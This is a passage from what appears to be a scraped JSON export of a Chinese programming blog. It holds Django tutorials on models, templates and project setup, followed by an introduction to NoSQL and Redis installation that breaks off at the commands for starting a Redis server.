Subject.objects.only('name').get(no=sno) teachers = Teacher.objects.filter(subject=subject).order_by('no') return render(request, 'teachers.html', { 'subject': subject, 'teachers': teachers }) except (ValueError, Subject.DoesNotExist): return redirect('/') 修改templates/subjects.html和templates/teachers.html模板页。 subjects.html &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;学科信息&lt;/title&gt; &lt;style&gt; #container { width: 80%; margin: 10px auto; } .user { float: right; margin-right: 10px; } .user&gt;a { margin-right: 10px; } #main&gt;dl&gt;dt { font-size: 1.5em; font-weight: bold; } #main&gt;dl&gt;dd { font-size: 1.2em; } a { text-decoration: none; color: darkcyan; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;div class=\"user\"&gt; &lt;a href=\"login.html\"&gt;用户登录&lt;/a&gt; &lt;a href=\"register.html\"&gt;快速注册&lt;/a&gt; &lt;/div&gt; &lt;h1&gt;扣丁学堂所有学科&lt;/h1&gt; &lt;hr&gt; &lt;div id=\"main\"&gt; {% for subject in subjects %} &lt;dl&gt; &lt;dt&gt; &lt;a href=\"/teachers/?sno={{ subject.no }}\"&gt;{{ subject.name }}&lt;/a&gt; {% if subject.is_hot %} &lt;img src=\"/static/images/hot-icon-small.png\"&gt; {% endif %} &lt;/dt&gt; &lt;dd&gt;{{ subject.intro }}&lt;/dd&gt; &lt;/dl&gt; {% endfor %} &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; teachers.html &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;老师信息&lt;/title&gt; &lt;style&gt; #container { width: 80%; margin: 10px auto; } .teacher { width: 100%; margin: 0 auto; padding: 10px 0; border-bottom: 1px dashed gray; overflow: auto; } .teacher&gt;div { float: left; } .photo { height: 140px; border-radius: 75px; overflow: hidden; margin-left: 20px; } .info { width: 75%; margin-left: 30px; } .info div { clear: both; margin: 5px 10px; } .info span { margin-right: 25px; } .info a { text-decoration: none; color: darkcyan; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;h1&gt;{{ subject.name }}学科的老师信息&lt;/h1&gt; &lt;hr&gt; {% if not teachers %} &lt;h2&gt;暂无该学科老师信息&lt;/h2&gt; {% endif %} {% for teacher in teachers %} &lt;div class=\"teacher\"&gt; &lt;div class=\"photo\"&gt; &lt;img src=\"/static/images/{{ teacher.photo }}\" height=\"140\" alt=\"\"&gt; &lt;/div&gt; &lt;div class=\"info\"&gt; &lt;div&gt; &lt;span&gt;&lt;strong&gt;姓名：{{ teacher.name }}&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;性别：{{ teacher.sex | yesno:'男,女' }}&lt;/span&gt; &lt;span&gt;出生日期：{{ teacher.birth | date:'Y年n月j日'}}&lt;/span&gt; &lt;/div&gt; &lt;div class=\"intro\"&gt;{{ teacher.intro }}&lt;/div&gt; &lt;div class=\"comment\"&gt; &lt;a href=\"\"&gt;好评&lt;/a&gt;&amp;nbsp;(&lt;strong&gt;{{ teacher.good_count }}&lt;/strong&gt;) &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a href=\"\"&gt;差评&lt;/a&gt;&amp;nbsp;&lt;strong&gt;{{ teacher.bad_count }}&lt;/strong&gt;) &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; {% endfor %} &lt;a href=\"/\"&gt;返回首页&lt;/a&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 修改vote/urls.py文件，实现映射URL。 from django.contrib import admin from django.urls import path from polls.views import show_subjects, show_teachers urlpatterns = [ path('admin/', admin.site.urls), path('', show_subjects), path('teachers/', show_teachers), ] 到此为止，页面上需要的图片（静态资源）还没有能够正常展示，我们在下一章节中为大家介绍如何处理模板页上的需要的静态资源。 补充内容Django模型最佳实践 正确的为模型和关系字段命名。 设置适当的related_name属性。 用OneToOneField代替ForeignKeyField(unique=True)。 通过“迁移操作”（migrate）来添加模型。 用NoSQL来应对需要降低范式级别的场景。 如果布尔类型可以为空要使用NullBooleanField。 在模型中放置业务逻辑。 用&lt;ModelName&gt;.DoesNotExists取代ObjectDoesNotExists。 在数据库中不要出现无效数据。 不要对QuerySet调用len()函数。 将QuerySet的exists()方法的返回值用于if条件。 用DecimalField来存储货币相关数据而不是FloatField。 定义__str__方法。 不要将数据文件放在同一个目录中。 说明：以上内容来自于STEELKIWI网站的Best Practice working with Django models in Python，有兴趣的小伙伴可以阅读原文。 模型定义参考字段对字段名称的限制 字段名不能是Python的保留字，否则会导致语法错误 字段名不能有多个连续下划线，否则影响ORM查询操作 Django模型字段类 字段类 说明 AutoField 自增ID字段 BigIntegerField 64位有符号整数 BinaryField 存储二进制数据的字段，对应Python的bytes类型 BooleanField 存储True或False CharField 长度较小的字符串 DateField 存储日期，有auto_now和auto_now_add属性 DateTimeField 存储日期和日期，两个附加属性同上 DecimalField 存储固定精度小数，有max_digits（有效位数）和decimal_places（小数点后面）两个必要的参数 DurationField 存储时间跨度 EmailField 与CharField相同，可以用EmailValidator验证 FileField 文件上传字段 FloatField 存储浮点数 ImageField 其他同FileFiled，要验证上传的是不是有效图像 IntegerField 存储32位有符号整数。 GenericIPAddressField 存储IPv4或IPv6地址 NullBooleanField 存储True、False或null值 PositiveIntegerField 存储无符号整数（只能存储正数） SlugField 存储slug（简短标注） SmallIntegerField 存储16位有符号整数 TextField 存储数据量较大的文本 TimeField 存储时间 URLField 存储URL的CharField UUIDField 存储全局唯一标识符 字段属性通用字段属性 选项 说明 null 数据库中对应的字段是否允许为NULL，默认为False blank 后台模型管理验证数据时，是否允许为NULL，默认为False choices 设定字段的选项，各元组中的第一个值是设置在模型上的值，第二值是人类可读的值 db_column 字段对应到数据库表中的列名，未指定时直接使用字段的名称 db_index 设置为True时将在该字段创建索引 db_tablespace 为有索引的字段设置使用的表空间，默认为DEFAULT_INDEX_TABLESPACE default 字段的默认值 editable 字段在后台模型管理或ModelForm中是否显示，默认为True error_messages 设定字段抛出异常时的默认消息的字典，其中的键包括null、blank、invalid、invalid_choice、unique和unique_for_date help_text 表单小组件旁边显示的额外的帮助文本。 primary_key 将字段指定为模型的主键，未指定时会自动添加AutoField用于主键，只读。 unique 设置为True时，表中字段的值必须是唯一的 verbose_name 字段在后台模型管理显示的名称，未指定时使用字段的名称 ForeignKey属性 limit_choices_to：值是一个Q对象或返回一个Q对象，用于限制后台显示哪些对象。 related_name：用于获取关联对象的关联管理器对象（反向查询），如果不允许反向，该属性应该被设置为'+'，或者以'+'结尾。 to_field：指定关联的字段，默认关联对象的主键字段。 db_constraint：是否为外键创建约束，默认值为True。 on_delete：外键关联的对象被删除时对应的动作，可取的值包括django.db.models中定义的： CASCADE：级联删除。 PROTECT：抛出ProtectedError异常，阻止删除引用的对象。 SET_NULL：把外键设置为null，当null属性被设置为True时才能这么做。 SET_DEFAULT：把外键设置为默认值，提供了默认值才能这么做。 ManyToManyField属性 symmetrical：是否建立对称的多对多关系。 through：指定维持多对多关系的中间表的Django模型。 throughfields：定义了中间模型时可以指定建立多对多关系的字段。 db_table：指定维持多对多关系的中间表的表名。 模型元数据选项 选项 说明 abstract 设置为True时模型是抽象父类 app_label 如果定义模型的应用不在INSTALLED_APPS中可以用该属性指定 db_table 模型使用的数据表名称 db_tablespace 模型使用的数据表空间 default_related_name 关联对象回指这个模型时默认使用的名称，默认为_set get_latest_by 模型中可排序字段的名称。 managed 设置为True时，Django在迁移中创建数据表并在执行flush管理命令时把表移除 order_with_respect_to 标记对象为可排序的 ordering 对象的默认排序 permissions 创建对象时写入权限表的额外权限 default_permissions 默认为('add', 'change', 'delete') unique_together 设定组合在一起时必须独一无二的字段名 index_together 设定一起建立索引的多个字段名 verbose_name 为对象设定人类可读的名称 verbose_name_plural 设定对象的复数名称 查询参考按字段查找可以用的条件 exact / iexact：精确匹配/忽略大小写的精确匹配查询 contains / icontains / startswith / istartswith / endswith / iendswith：基于like的模糊查询 in ：集合运算 gt / gte / lt / lte：大于/大于等于/小于/小于等于关系运算 range：指定范围查询（SQL中的between…and…） year / month / day / week_day / hour / minute / second：查询时间日期 isnull：查询空值（True）或非空值（False） search：基于全文索引的全文检索（一般很少使用） regex / iregex：基于正则表达式的模糊匹配查询","categories":[],"tags":[{"name":"深入模型","slug":"深入模型","permalink":"http://www.xiaocaibi.top/tags/%E6%B7%B1%E5%85%A5%E6%A8%A1%E5%9E%8B/"}]},{"title":"41.Django快速上手","slug":"41-Django快速上手","date":"2021-05-27T02:07:44.000Z","updated":"2021-09-20T08:47:43.916Z","comments":true,"path":"posts/297f305f.html","link":"","permalink":"http://www.xiaocaibi.top/posts/297f305f.html","excerpt":"","text":"Django快速上手Web开发的早期阶段，开发者需要手动编写每个页面，例如一个新闻门户网站，每天都要修改它的HTML页面，随着网站规模和体量的增大，这种做法一定是非常糟糕的。为了解决这个问题，开发人员想到了用程序来为Web服务器生成动态内容，也就是说网页中的动态内容不再通过手动编写而是通过程序自动生成。最早的时候，这项技术被称为CGI（公共网关接口），当然随着时间的推移，CGI暴露出的问题也越来越多，例如大量重复的样板代码，总体性能较为低下等。在时代呼唤新英雄的背景下，PHP、ASP、JSP这类Web应用开发技术在上世纪90年代中后期如雨后春笋般涌现。通常我们说的Web应用是指通过浏览器来访问网络资源的应用程序，因为浏览器的普及性以及易用性，Web应用使用起来方便简单，免除了安装和更新应用程序带来的麻烦；站在开发者的角度，也不用关心用户使用什么样的操作系统，甚至不用区分是PC端还是移动端。 Web应用机制和术语下图向我们展示了Web应用的工作流程，其中涉及到的术语如下表所示。 说明：相信有经验的读者会发现，这张图中其实还少了很多东西，例如反向代理服务器、数据库服务器、防火墙等，而且图中的每个节点在实际项目部署时可能是一组节点组成的集群。当然，如果你对这些没有什么概念也不要紧，继续下去就行了，后面会给大家一一讲解的。 术语 解释 URL/URI 统一资源定位符/统一资源标识符，网络资源的唯一标识 域名 与Web服务器地址对应的一个易于记忆的字符串名字 DNS 域名解析服务，可以将域名转换成对应的IP地址 IP地址 网络上的主机的身份标识，通过IP地址可以区分不同的主机 HTTP 超文本传输协议，构建在TCP之上的应用级协议，万维网数据通信的基础 反向代理 代理客户端向服务器发出请求，然后将服务器返回的资源返回给客户端 Web服务器 接受HTTP请求，然后返回HTML文件、纯文本文件、图像等资源给请求者 Nginx 高性能的Web服务器，也可以用作反向代理，负载均衡&nbsp;和&nbsp;HTTP缓存 HTTP协议这里我们先费一些笔墨来说说HTTP这个协议。HTTP（超文本传输协议）是构建于TCP（传输控制协议）之上应用级协议，它利用了TCP提供的可靠的传输服务实现了Web应用中的数据交换。按照维基百科上的介绍，设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法，也就是说这个协议是浏览器和Web服务器之间传输的数据的载体。关于这个协议的详细信息以及目前的发展状况，大家可以阅读《HTTP 协议入门》、《互联网协议入门》系列以及《图解HTTPS协议》这几篇文章进行了解。下图是我在四川省网络通信技术重点实验室学习和工作期间使用开源协议分析工具Ethereal（抓包工具WireShark的前身）截取的访问百度首页时的HTTP请求和响应的报文（协议数据），由于Ethereal截取的是经过网络适配器的数据，因此可以清晰的看到从物理链路层到应用层的协议数据。 HTTP请求（请求行+请求头+空行+[消息体]）： HTTP响应（响应行+响应头+空行+消息体）： 说明：这两张图是在2009年9月10日凌晨获得的，但愿这两张如同泛黄的照片般的截图能帮助你了解HTTP到底是什么样子的。当然，如果没有专业的抓包工具，也可以通过浏览器提供的“开发者工具”来查看HTTP请求和响应的数据格式。 Django概述Python的Web框架有上百个，比它的关键字还要多。所谓Web框架，就是用于开发Web服务器端应用的基础设施，说得通俗一点就是一系列封装好的模块和工具。事实上，即便没有Web框架，我们仍然可以通过socket或CGI来开发Web服务器端应用，但是这样做的成本和代价在商业项目中通常是不能接受的。通过Web框架，我们可以化繁为简，降低创建、更新、扩展应用程序的工作量。刚才我们说到Python有上百个Web框架，这些框架包括Django、Flask、Tornado、Sanic、Pyramid、Bottle、Web2py、web.py等。 在上述Python的Web框架中，Django无疑是最有代表性的重量级选手，开发者可以基于Django快速的开发可靠的Web应用程序，因为它减少了Web开发中不必要的开销，对常用的设计和开发模式进行了封装，并对MVC架构提供了支持（Django中称之为MTV架构）。MVC是软件系统开发领域中一种放之四海而皆准的架构，它将系统中的组件分为模型（Model）、视图（View）和控制器（Controller）三个部分并借此实现模型（数据）和视图（显示）的解耦合。由于模型和视图进行了分离，所以需要一个中间人将解耦合的模型和视图联系起来，扮演这个角色的就是控制器。稍具规模的软件系统都会使用MVC架构（或者是从MVC演进出的其他架构），Django项目中我们称之为MTV，MTV中的M跟MVC中的M没有区别，就是代表数据的模型，T代表了网页模板（显示数据的视图），而V代表了视图函数，在Django框架中，视图函数和Django框架本身一起扮演了MVC中C的角色。 Django框架诞生于2003年，它是一个在真正的应用中成长起来的项目，由劳伦斯出版集团旗下在线新闻网站的内容管理系统（CMS）研发团队（主要是Adrian Holovaty和Simon Willison）开发，以比利时的吉普赛爵士吉他手Django Reinhardt来命名。Django框架在2005年夏天作为开源框架发布，使用Django框架能用很短的时间构建出功能完备的网站，因为它代替程序员完成了那些重复乏味的劳动，剩下真正有意义的核心业务给程序员来开发，这一点就是对DRY（Don’t Repeat Yourself）理念的最好践行。许多成功的网站和应用都是基于Python语言进行开发的，国内比较有代表性的网站包括：知乎、豆瓣网、果壳网、搜狐闪电邮箱、101围棋网、海报时尚网、背书吧、堆糖、手机搜狐网、咕咚、爱福窝、果库等，其中不乏使用了Django框架的产品。 快速上手第一个Django项目 检查Python环境：Django 1.11需要Python 2.7或Python 3.4以上的版本；Django 2.0需要Python 3.4以上的版本；Django 2.1和2.2需要Python 3.5以上的版本；Django 3.0需要Python 3.6以上版本。 说明：Django框架不同版本所需的Python解释器环境，可以在Django官方文档的FAQ中找到。 可以在macOS的终端中输入下面的命令检查Python解释器版本，Windows系统可以在命令行提示符中输入python --version。 python3 --version 也可以在Python的交互式环境中执行下面的代码来查看Python解释器的版本。 import sys sys.version sys.version_info 更新包管理工具并安装Django环境（用于创建Django项目）。 说明：在更新这个文档时，Django最新的正式版本是3.0.7，Django 3.0提供了对ASGI的支持，可以实现全双工的异步通信，但是目前的使用体验一般，所以暂时不推荐大家使用Django 3.0，下面我们安装的是Django 2.2.13版本。使用pip安装三方库和工具时，可以通过==来指定安装的版本。 pip3 install -U pip pip3 install django==2.2.13 检查Django环境并使用django-admin命令创建Django项目（项目名称为hellodjango）。 django-admin --version django-admin startproject hellodjango 用PyCharm打开创建好的Djang项目，并为其添加虚拟环境。 如上图所示，PyCharm的项目浏览器中，最顶层的文件夹hellodjango是Python项目文件夹，这个文件夹的名字并不重要，Django项目也不关心这个文件夹叫什么名字。该文件夹下有一个同名的文件夹，它是Django项目文件夹，其中包含了__init__.py、settings.py、urls.py、wsgi.py四个文件，与名为hellodjango的Django项目文件夹同级的还有一个名为manage.py 的文件，这些文件的作用如下所示： hellodjango/__init__.py：空文件，告诉Python解释器这个目录应该被视为一个Python的包。 hellodjango/settings.py：Django项目的配置文件。 hellodjango/urls.py：Django项目的URL映射声明，就像是网站的“目录”。 hellodjango/wsgi.py：项目运行在WSGI兼容Web服务器上的入口文件。 manage.py： 管理Django项目的脚本程序。 说明：WSGI全称是Web服务器网关接口，维基百科上给出的解释是“为Python语言定义的Web服务器和Web应用程序或框架之间的一种简单而通用的接口”。 创建虚拟环境的界面如下图所示。 安装项目依赖项。 方法一：打开PyCharm的终端，在终端中通过pip命令安装Django项目的依赖项。 说明：由于已经基于Python 3解释器环境为项目创建了虚拟环境，所以虚拟环境中的python命令对应的是Python 3的解释器，而pip命令对应的是Python 3的包管理工具。 pip install django==2.2.13 方法二：在PyCharm的偏好设置中，可以找到项目的解释器环境和已经安装的三方库，可以通过点击添加按钮来安装新的依赖项，需要提醒大家的是在安装Django依赖项时，需要指定版本号，否则将默认安装更新本文时最新的3.0.7版本。 下图展示了Django版本和Python版本的对应关系，请大家自行对号入座。 Django版本 Python版本 1.8 2.7、3.2、3.3、3.4、3.5 1.9、1.10 2.7、3.4、3.5 1.11 2.7、3.4、3.5、3.6、3.7（Django 1.11.17） 2.0 3.4、3.5、3.6、3.7 2.1 3.5、3.6、3.7 2.2 3.5、3.6、3.7、3.8（Django 2.2.8） 3.0 3.6、3.7、3.8 启动Django自带的服务器运行项目。 方法一：在“Run”菜单选择“Edit Configuration”，配置“Django server”运行项目（适用于专业版PyCharm）。 方法二：在“Run”菜单选择“Edit Configuration”，配置运行“Python”程序运行项目（适用于专业版和社区版PyCharm）。 方法三：在PyCharm的终端（Terminal）中通过命令运行项目（适用于专业版和社区版PyCharm）。 python manage.py runserver 查看运行效果。 在浏览器中输入http://127.0.0.1:8000访问我们的服务器，效果如下图所示。 说明： 刚刚启动的Django自带的服务器只能用于开发和测试环境，因为这个服务器是纯Python编写的轻量级Web服务器，不适合在生产环境中使用。 如果修改了代码，不需要为了让修改的代码生效而重新启动Django自带的服务器。但是，在添加新的项目文件时，该服务器不会自动重新加载，这个时候就得手动重启服务器。 可以在终端中通过python manage.py help命令查看Django管理脚本程序可用的命令参数。 使用python manage.py runserver启动服务器时，可以在后面添加参数来指定IP地址和端口号，默认情况下启动的服务器将运行在本机的8000端口。 在终端中运行的服务器，可以通过Ctrl+C来停止它 。通过PyCharm的“运行配置”运行的服务器直接点击窗口上的关闭按钮就可以终止服务器的运行。 不能在同一个端口上启动多个服务器，因为会导致地址的冲突（端口是对IP地址的扩展，也是计算机网络地址的一部分）。 修改项目的配置文件settings.py。 Django是一个支持国际化和本地化的框架，因此刚才我们看到的Django项目的默认首页也是支持国际化的，我们可以通过修改配置文件将默认语言修改为中文，时区设置为东八区。 找到修改前的配置（在settings.py文件第100行以后）。 LANGUAGE_CODE = 'en-us' TIME_ZONE = 'UTC' 修改为以下内容。 LANGUAGE_CODE = 'zh-hans' TIME_ZONE = 'Asia/Chongqing' 刷新刚才的页面，可以看到修改语言代码和时区之后的结果。 创建自己的应用如果要开发自己的Web应用，需要先在Django项目中创建“应用”，一个Django项目可以包含一个或多个应用。 在PyCharm的终端中执行下面的命令，创建名为first的应用。 python manage.py startapp first 执行上面的命令会在当前路径下创建first目录，其目录结构如下所示： __init__.py：一个空文件，告诉Python解释器这个目录应该被视为一个Python的包。 admin.py：可以用来注册模型，用于在Django框架自带的管理后台中管理模型。 apps.py：当前应用的配置文件。 migrations：存放与模型有关的数据库迁移信息。 __init__.py：一个空文件，告诉Python解释器这个目录应该被视为一个Python的包。 models.py：存放应用的数据模型（MTV中的M）。 tests.py：包含测试应用各项功能的测试类和测试函数。 views.py：处理用户HTTP请求并返回HTTP响应的函数或类（MTV中的V）。 修改应用目录下的视图文件views.py。 from django.http import HttpResponse def show_index(request): return HttpResponse('&lt;h1&gt;Hello, Django!&lt;/h1&gt;') 修改Django项目目录下的urls.py文件，将视图函数和用户在浏览器中请求的路径对应。 from django.contrib import admin from django.urls import path, include from first.views import show_index urlpatterns = [ path('admin/', admin.site.urls), path('hello/', show_index), ] 重新运行项目，并打开浏览器中访问http://127.0.0.1:8000/hello/。 上面我们通过代码为浏览器生成了内容，但仍然是静态内容，如果要生成动态内容，可以修改views.py文件并添加如下所示的代码。 from random import sample from django.http import HttpResponse def show_index(request): fruits = [ 'Apple', 'Orange', 'Pitaya', 'Durian', 'Waxberry', 'Blueberry', 'Grape', 'Peach', 'Pear', 'Banana', 'Watermelon', 'Mango' ] selected_fruits = sample(fruits, 3) content = '&lt;h3&gt;今天推荐的水果是：&lt;/h3&gt;' content += '&lt;hr&gt;' content += '&lt;ul&gt;' for fruit in selected_fruits: content += f'&lt;li&gt;{fruit}&lt;/li&gt;' content += '&lt;/ul&gt;' return HttpResponse(content) 刷新页面查看程序的运行结果，看看每次刷新的网页的时候，是不是可以看到不一样的内容。 使用模板上面通过拼接HTML代码的方式为浏览器生成动态内容的做法在实际开发中是无能接受的，因为实际项目中的前端页面可能非常复杂，无法用这种拼接动态内容的方式来完成，这一点大家一定能够想到。为了解决这个问题，我们可以提前准备一个模板页（MTV中的T），所谓模板页就是一个带占位符和模板指令的HTML页面。 Django框架中有一个名为render的便捷函数可以来完成渲染模板的操作。所谓的渲染就是用数据替换掉模板页中的模板指令和占位符，当然这里的渲染称为后端渲染，即在服务器端完成页面的渲染再输出到浏览器中。后端渲染的做法在Web应用的访问量较大时，会让服务器承受较大的负担，所以越来越多的Web应用会选择前端渲染的方式，即服务器只提供页面所需的数据（通常是JSON格式），在浏览器中通过JavaScript代码获取这些数据并渲染页面上。关于前端渲染的内容，我们会在后续的课程中为大家讲解，目前我们使用的是通过模板页进行后端渲染的做法，具体步骤如下所示。 使用模板页的步骤如下所示。 在项目目录下创建名为templates文件夹。 添加模板页index.html。 说明：实际项目开发中，静态页由前端开发者提供，后端开发者需要将静态页修改为模板页，以便通过Python程序对其进行渲染，这种做法就是上面提到的后端渲染。 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;首页&lt;/title&gt; &lt;style&gt; #fruits { font-size: 1.25em; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;今天推荐的水果是：&lt;/h1&gt; &lt;hr&gt; &lt;ul id=\"fruits\"&gt; {% for fruit in fruits %} &lt;li&gt;{{ fruit }}&lt;/li&gt; {% endfor %} &lt;/ul&gt; &lt;/body&gt; &lt;/html&gt; 在上面的模板页中我们使用了{{ fruit }}这样的模板占位符语法，也使用了{% for %}这样的模板指令，这些都是Django模板语言（DTL）的一部分。关于模板语法和指令，大家可以看看官方文档，相信这些内容还是很容易理解的，并不需要过多的赘述，大家也可以参考官方文档了解模板指令和语法。 修改views.py文件，调用render函数渲染模板页。 from random import sample from django.shortcuts import render def show_index(request): fruits = [ 'Apple', 'Orange', 'Pitaya', 'Durian', 'Waxberry', 'Blueberry', 'Grape', 'Peach', 'Pear', 'Banana', 'Watermelon', 'Mango' ] selected_fruits = sample(fruits, 3) return render(request, 'index.html', {'fruits': selected_fruits}) render函数的第一个参数是请求对象request，第二个参数是我们要渲染的模板页的名字，第三个参数是要渲染到页面上的数据，我们通过一个字典将数据交给模板页，字典中的键就是模板页中使用的模板指令或占位符中的变量名。 到此为止，视图函数中的render还无法找到模板文件index.html，需要修改settings.py文件，配置模板文件所在的路径。修改settings.py文件，找到TEMPLATES配置，修改其中的DIRS配置。 TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR, 'templates'), ], 'APP_DIRS': True, 'OPTIONS': { 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, }, ] 重新运行项目或直接刷新页面查看结果。 总结至此，我们已经利用Django框架完成了一个非常小的Web应用，虽然它并没有任何的实际价值，但是可以通过这个项目对Django框架有一个感性的认识。学习Django最好的资料肯定是它的官方文档，官方文档提供了对多国语言的支持，而且有新手教程引导初学者学习使用Django框架，建议大家通过阅读Django的官方文档来学习和使用这个框架。当然图灵社区出版的《Django基础教程》也是非常适合初学者的入门级读物，有兴趣的读者可以点击链接进行购买。","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"http://www.xiaocaibi.top/tags/Django/"}]},{"title":"36-40.NoSQL数据库入门","slug":"36-40-NoSQL数据库入门","date":"2021-05-26T01:43:36.000Z","updated":"2021-09-20T08:47:43.916Z","comments":true,"path":"posts/cf194842.html","link":"","permalink":"http://www.xiaocaibi.top/posts/cf194842.html","excerpt":"","text":"NoSQL入门NoSQL概述如今，大多数的计算机系统（包括服务器、PC、移动设备等）都会产生庞大的数据量。其实，早在2012年的时候，全世界每天产生的数据量就达到了2.5EB（艾字节，$$1EB\\approx10^{18}B$$）。这些数据有很大一部分是由关系型数据库来存储和管理的。 早在1970年，E.F.Codd发表了论述关系型数据库的著名论文“A relational model of data for large shared data banks”，这篇文章奠定了关系型数据库的基础并在接下来的数十年时间内产生了深远的影响。实践证明，关系型数据库是实现数据持久化最为重要的方式，它也是大多数应用在选择持久化方案时的首选技术。 NoSQL是一项全新的数据库革命性运动，虽然它的历史可以追溯到1998年，但是NoSQL真正深入人心并得到广泛的应用是在进入大数据时候以后，业界普遍认为NoSQL是更适合大数据存储的技术方案，这才使得NoSQL的发展达到了前所未有的高度。2012年《纽约时报》的一篇专栏中写到，大数据时代已经降临，在商业、经济及其他领域中，决策将不再基于经验和直觉而是基于数据和分析而作出。事实上，在天文学、气象学、基因组学、生物学、社会学、互联网搜索引擎、金融、医疗、社交网络、电子商务等诸多领域，由于数据过于密集和庞大，在数据的分析和处理上也遇到了前所未有的限制和阻碍，这一切都使得对大数据处理技术的研究被提升到了新的高度，也使得各种NoSQL的技术方案进入到了公众的视野。 NoSQL数据库按照其存储类型可以大致分为以下几类： 类型 部分代表 特点 列族数据库 HBaseCassandraHypertable 顾名思义是按列存储数据的。最大的特点是方便存储结构化和半结构化数据，方便做数据压缩，对针对某一列或者某几列的查询有非常大的I/O优势，适合于批量数据处理和即时查询。 文档数据库 MongoDBCouchDBElasticSearch 文档数据库一般用类JSON格式存储数据，存储的内容是文档型的。这样也就有机会对某些字段建立索引，实现关系数据库的某些功能，但不提供对参照完整性和分布事务的支持。 KV数据库 DynamoDBRedisLevelDB 可以通过key快速查询到其value，有基于内存和基于磁盘两种实现方案。 图数据库 Neo4JFlockDBJanusGraph 使用图结构进行语义查询的数据库，它使用节点、边和属性来表示和存储数据。图数据库从设计上，就可以简单快速的检索难以在关系系统中建模的复杂层次结构。 对象数据库 db4oVersant 通过类似面向对象语言的语法操作数据库，通过对象的方式存取数据。 说明：想了解更多的NoSQL数据库，可以访问http://nosql-database.org/。 Redis概述Redis是一种基于键值对的NoSQL数据库，它提供了对多种数据类型（字符串、哈希、列表、集合、有序集合、位图等）的支持，能够满足很多应用场景的需求。Redis将数据放在内存中，因此读写性能是非常惊人的。与此同时，Redis也提供了持久化机制，能够将内存中的数据保存到硬盘上，在发生意外状况时数据也不会丢掉。此外，Redis还支持键过期、地理信息运算、发布订阅、事务、管道、Lua脚本扩展等功能，总而言之，Redis的功能和性能都非常强大，如果项目中要实现高速缓存和消息队列这样的服务，直接交给Redis就可以了。目前，国内外很多著名的企业和商业项目都使用了Redis，包括：Twitter、Github、StackOverflow、新浪微博、百度、优酷土豆、美团、小米、唯品会等。 Redis简介2008年，一个名为Salvatore Sanfilippo的程序员为他开发的LLOOGG项目定制了专属的数据库（因为之前他无论怎样优化MySQL，系统性能已经无法再提升了），这项工作的成果就是Redis的初始版本。后来他将Redis的代码放到了全球最大的代码托管平台Github，从那以后，Redis引发了大量开发者的好评和关注，继而有数百人参与了Redis的开发和维护，这使得Redis的功能越来越强大和性能越来越好。 Redis是REmote DIctionary Server的缩写，它是一个用ANSI C编写的高性能的key-value存储系统，与其他的key-value存储系统相比，Redis有以下一些特点（也是优点）： Redis的读写性能极高，并且有丰富的特性（发布/订阅、事务、通知等）。 Redis支持数据的持久化（RDB和AOF两种方式），可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。 Redis支持多种数据类型，包括：string、hash、list、set，zset、bitmap、hyperloglog等。 Redis支持主从复制（实现读写分析）以及哨兵模式（监控master是否宕机并自动调整配置）。 Redis支持分布式集群，可以很容易的通过水平扩展来提升系统的整体性能。 Redis基于TCP提供的可靠传输服务进行通信，很多编程语言都提供了Redis客户端支持。 Redis的应用场景 高速缓存 - 将不常变化但又经常被访问的热点数据放到Redis数据库中，可以大大降低关系型数据库的压力，从而提升系统的响应性能。 排行榜 - 很多网站都有排行榜功能，利用Redis中的列表和有序集合可以非常方便的构造各种排行榜系统。 商品秒杀/投票点赞 - Redis提供了对计数操作的支持，网站上常见的秒杀、点赞等功能都可以利用Redis的计数器通过+1或-1的操作来实现，从而避免了使用关系型数据的update操作。 分布式锁 - 利用Redis可以跨多台服务器实现分布式锁（类似于线程锁，但是能够被多台机器上的多个线程或进程共享）的功能，用于实现一个阻塞式操作。 消息队列 - 消息队列和高速缓存一样，是一个大型网站不可缺少的基础服务，可以实现业务解耦和非实时业务削峰等特性，这些我们都会在后面的项目中为大家展示。 Redis的安装和配置可以使用Linux系统的包管理工具（如yum）来安装Redis，也可以通过在Redis的官方网站下载Redis的源代码，解压缩解归档之后通过make工具对源代码进行构建并安装，在更新这篇文档时，Redis官方提供的最新稳定版本是Redis 5.0.10。 下载： wget https://download.redis.io/releases/redis-5.0.10.tar.gz 解压缩和解归档： tar -zxf redis-5.0.10.tar.gz 进入Redis源代码目录： cd redis-5.0.10 构建和安装： make &amp;&amp; make install 在redis源代码目录下有一个名为redis.conf的配置文件，我们可以先查看一下该文件。 vim redis.conf 下面我们对Redis的配置文件进行一个扼要的介绍。 配置Redis服务的IP地址和端口： 配置底层有多少个数据库： 配置Redis的持久化机制 - RDB。 配置Redis的持久化机制 - AOF： 配置访问Redis服务器的口令： 配置Redis的主从复制（通过主从复制可以实现读写分离）： 配置慢查询： 上面这些内容就是Redis的基本配置，如果你对上面的内容感到困惑也没有关系，先把Redis用起来再回头去推敲这些内容就行了。如果想找一些参考书，《Redis开发与运维》是一本不错的入门读物，而《Redis实战》是不错的进阶读物。 Redis的服务器和客户端接下来启动Redis服务器，下面的方式将以默认的配置启动Redis服务。 redis-server 如果希望修改Redis的配置（如端口、认证口令、持久化方式等），可以通过下面两种方式。 方式一：通过参数指定认证口令和AOF持久化方式。 redis-server --requirepass yourpass --appendonly yes 方式二：通过指定的配置文件来修改Redis的配置。 redis-server /root/redis-5.0.10/redis.conf 